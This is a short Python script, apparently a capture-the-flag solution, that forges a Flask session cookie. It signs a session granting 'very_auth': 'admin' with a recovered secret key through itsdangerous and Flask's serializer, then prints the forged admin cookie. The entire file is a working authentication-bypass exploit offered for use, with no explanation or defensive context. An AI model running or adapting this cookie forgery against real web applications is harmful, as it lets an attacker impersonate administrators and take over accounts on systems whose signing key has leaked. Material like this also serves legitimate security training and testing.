import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

secret = "[secret_key]"

serializer = URLSafeTimedSerializer(
    secret_key=secret,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={
        "key_derivation": "hmac",
        "digest_method": hashlib.sha1
    }
)

# Forge new session
new_session = {
    "very_auth": "admin"
}

forged_cookie = serializer.dumps(new_session)

print("[+] Forged admin cookie:")
print(forged_cookie)

